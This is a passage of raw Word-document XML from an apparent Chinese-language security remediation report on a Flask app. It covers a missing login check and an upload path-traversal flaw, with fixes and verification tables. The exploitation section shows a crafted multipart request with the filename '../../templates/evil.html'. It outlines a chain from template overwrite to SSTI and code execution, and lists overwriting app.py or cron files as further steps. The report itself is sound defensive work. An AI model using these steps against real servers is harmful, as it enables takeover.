        <w:t>：涉及用户数据的接口无需认证即违反数据安全法和 GDPR 等法规要求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>增加登录态校验：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 新增登录态校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not session.get("username"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试步骤</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">清除 Cookie 后访问 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=help</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">重定向至 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">登录后访问 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=help</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>正常显示帮助中心</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 8】上传文件名路径穿越（CWE-22/CWE-434）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>POST /upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-22: Path Traversal / CWE-434: Unrestricted Upload of Dangerous File Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>虽然做了扩展名白名单校验（仅允许 jpg/png/gif 等图片后缀），但</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>未对文件名本身进行任何处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">——用户上传的文件名被原样用于文件保存路径。攻击者可以在文件名中插入 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径穿越序列，使文件保存到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>static/uploads/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录之外的其他位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 修复前：直接使用用户提供的文件名</w:t>
        <w:br/>
        <w:t>filepath = os.path.join("static/uploads", file.filename)</w:t>
        <w:br/>
        <w:t>file.save(filepath)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>os.path.join("static/uploads", "../../templates/evil.html")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 解析后实际路径为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>templates/evil.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Step 1: 使用 Burp Suite 抓包或直接构造 HTTP 请求</w:t>
        <w:br/>
        <w:t>POST /upload HTTP/1.1</w:t>
        <w:br/>
        <w:t>Content-Type: multipart/form-data; boundary=----BOUNDARY</w:t>
        <w:br/>
        <w:t>Cookie: session=...</w:t>
        <w:br/>
        <w:br/>
        <w:t>------BOUNDARY</w:t>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="avatar"; filename="../../templates/evil.html"</w:t>
        <w:br/>
        <w:t>Content-Type: image/jpeg</w:t>
        <w:br/>
        <w:br/>
        <w:t>[JPEG 文件头 + Jinja2 SSTI Payload]</w:t>
        <w:br/>
        <w:t>------BOUNDARY--</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 2: 操作系统解析后的实际路径</w:t>
        <w:br/>
        <w:t>服务器拼接：static/uploads/../../templates/evil.html</w:t>
        <w:br/>
        <w:t>解析后：templates/evil.html  ✅ 路径穿越成功！</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 3: 访问被覆盖的模板触发 SSTI</w:t>
        <w:br/>
        <w:t>GET / → 渲染 evil.html → SSTI payload 执行 → RCE</w:t>
        <w:br/>
        <w:br/>
        <w:t>Step 4: 进一步攻击</w:t>
        <w:br/>
        <w:t>可继续上传：</w:t>
        <w:br/>
        <w:t>- ../../app.py               → 覆盖后端源码</w:t>
        <w:br/>
        <w:t>- ../../static/css/style.css → 覆盖前端文件实现钓鱼</w:t>
        <w:br/>
        <w:t>- ../../../etc/cron.d/evil   → 写入 crontab 定时任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 模板覆盖 → SSTI → 远程代码执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：这是危害最大的路径，可直接控制服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 源码覆盖</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：覆盖 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>app.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可在应用中植入后门</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 任意文件写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：理论上可写入系统任意目录，如 crontab、SSH authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 供应链投毒</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：覆盖前端文件实现 XSS 投毒，所有访问用户均受影响</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">放弃原始文件名，使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>UUID 重命名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，彻底根除路径穿越：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 修复后：使用 UUID 重命名文件</w:t>
        <w:br/>
        <w:t>import uuid</w:t>
        <w:br/>
        <w:br/>
        <w:t>safe_filename = f"{uuid.uuid4().hex}.{ext}"     # 如 "a1b2c3d4e5f6...jpg"</w:t>
        <w:br/>
        <w:t>filepath = os.path.join("static/uploads", safe_filename)</w:t>
        <w:br/>
        <w:t>file.save(filepath)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">上传文件名为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../templates/evil.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">保存为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
